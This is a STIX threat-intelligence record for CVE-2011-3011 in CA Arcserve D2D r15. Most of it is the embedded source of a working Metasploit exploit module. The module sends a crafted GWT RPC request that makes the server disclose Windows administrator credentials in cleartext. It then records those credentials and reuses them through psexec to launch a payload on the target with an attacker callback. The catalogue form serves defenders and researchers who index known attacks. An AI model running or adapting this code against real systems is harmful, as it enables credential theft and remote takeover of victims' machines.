{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9fb81fad-b04a-4beb-a2f7-503570c717a6",
    "created": "2024-08-14T16:55:47.436776Z",
    "modified": "2024-08-14T16:55:47.43678Z",
    "name": "CA Arcserve D2D GWT RPC Credential Information Disclosure",
    "description": " This module exploits an information disclosure vulnerability in the CA Arcserve D2D r15 web server. The information disclosure can be triggered by sending a specially crafted RPC request to the homepage servlet. This causes CA Arcserve to disclosure the username and password in cleartext used for authentication. This username and password pair are Windows credentials with Administrator access. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/ca_arcserve_rpc_authbypass.rb",
            "external_id": "ca_arcserve_rpc_authbypass.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-3011"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'CA Arcserve D2D GWT RPC Credential Information Disclosure',\n      'Description'    => %q{\n          This module exploits an information disclosure vulnerability in the CA Arcserve\n        D2D r15 web server. The information disclosure can be triggered by sending a\n        specially crafted RPC request to the homepage servlet. This causes CA Arcserve to\n        disclosure the username and password in cleartext used for authentication. This\n        username and password pair are Windows credentials with Administrator access.\n      },\n      'Author'         =>\n        [\n          'bannedit', # metasploit module\n          'rgod', # original public exploit\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2011-3011' ],\n          [ 'OSVDB', '74162' ],\n          [ 'EDB', '17574' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process'\n        },\n      'Privileged'     => true,\n      'Payload'        =>\n        {\n          'Space'    => 1000,\n          'BadChars' => \"\\x00\\x0d\\x0a\"\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Automatic', { } ],\n        ],\n      'DisclosureDate' => '2011-07-25',\n      'DefaultTarget' => 0))\n\n\n    register_options(\n      [\n        Opt::RPORT(8014),\n      ])\n  end\n\n  def service_details\n    super.merge({\n      port: 445,\n      service_name: 'smb',\n      post_reference_name: self.refname,\n      last_attempted_at: DateTime.now\n    })\n  end\n\n  def exploit\n    print_status(\"Sending request to #{datastore['RHOST']}:#{datastore['RPORT']}\")\n\n    data  = \"5|0|4|\"\n    data << \"http://#{datastore['RHOST']}:#{datastore['RPORT']}\"\n    data << \"/contents/\"\n    data << \"|2C6B33BED38F825C48AE73C093241510|\"\n    data << \"com.ca.arcflash.ui.client.homepage.HomepageService\"\n    data << \"|getLocalHost|1|2|3|4|0|\"\n\n    cookie = \"donotshowgettingstarted=%7B%22state%22%3Atrue%7D\"\n\n    res = send_request_raw({\n      'uri'     => '/contents/service/homepage',\n      'version' => '1.1',\n      'method'  => 'POST',\n      'cookie'  => cookie,\n      'data'    => data,\n      'headers' =>\n      {\n        'Content-Type'  => \"text/x-gwt-rpc; charset=utf-8\",\n        'Content-Length' => data.length\n      }\n    }, 5)\n\n    if not res\n      fail_with(Failure::NotFound, 'The server did not respond to our request')\n    end\n\n    resp = res.to_s.split(',')\n\n    user_index = resp.index(\"\\\"user\\\"\")\n    pass_index = resp.index(\"\\\"password\\\"\")\n\n    if user_index.nil? and pass_index.nil?\n      # Not a vulnerable server (blank user/pass doesn't help us)\n      fail_with(Failure::NotFound, 'The server did not return credentials')\n    end\n\n    user = resp[user_index+1].gsub(/\\\"/, \"\")\n    pass = \"\"\n\n    if pass_index\n      pass = resp[pass_index+1].gsub(/\\\"/, \"\")\n    end\n\n    srvc = {\n        :host   => datastore['RHOST'],\n        :port   => datastore['RPORT'],\n        :proto  => 'tcp',\n        :name   => 'http',\n        :info   => res.headers['Server'] || \"\"\n      }\n    report_service(srvc)\n    if user.nil? or pass.nil?\n      print_error(\"Failed to collect the username and password\")\n      return\n    end\n\n    print_good(\"Collected credentials User: '#{user}' Password: '#{pass}'\")\n\n    # try psexec on the remote host\n    psexec = framework.exploits.create(\"windows/smb/psexec\")\n    psexec.register_parent(self)\n\n    psexec.datastore['PAYLOAD'] = self.datastore['PAYLOAD']\n\n    if self.datastore['LHOST'] and self.datastore['LPORT']\n      psexec.datastore['LHOST'] = self.datastore['LHOST']\n      psexec.datastore['LPORT'] = self.datastore['LPORT']\n    end\n\n    psexec.datastore['RHOST'] = self.datastore['RHOST']\n\n    psexec.datastore['DisablePayloadHandler'] = true\n    psexec.datastore['SMBPass'] = pass\n    psexec.datastore['SMBUser'] = user\n\n    print_status(\"Attempting to login via windows/smb/psexec\")\n\n    # this is kind of nasty would be better to split psexec code out to a mixin (on the TODO List)\n    begin\n      psexec.exploit_simple(\n        'LocalInput'  => self.user_input,\n        'LocalOutput' => self.user_output,\n        'Payload'  => psexec.datastore['PAYLOAD'],\n        'RunAsJob' => true\n      )\n    rescue\n      credential_data = {\n        user: user,\n        private_data: pass,\n        status: Metasploit::Model::Login::Status::INCORRECT\n      }.merge(service_details)\n      create_credential_and_login(credential_data)\n\n      print_error(\"Login attempt using windows/smb/psexec failed\")\n      print_status(\"Credentials have been stored and may be useful for authentication against other services.\")\n      # report the auth\n      return\n    end\n\n    # report the auth\n    credential_data = {\n        user: user,\n        private_data: pass,\n        status: Metasploit::Model::Login::Status::SUCCESSFUL\n    }.merge(service_details)\n    create_credential_and_login(credential_data)\n\n    handler\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-07-25",
    "x_mitre_platforms": [
        "win'"
    ]
}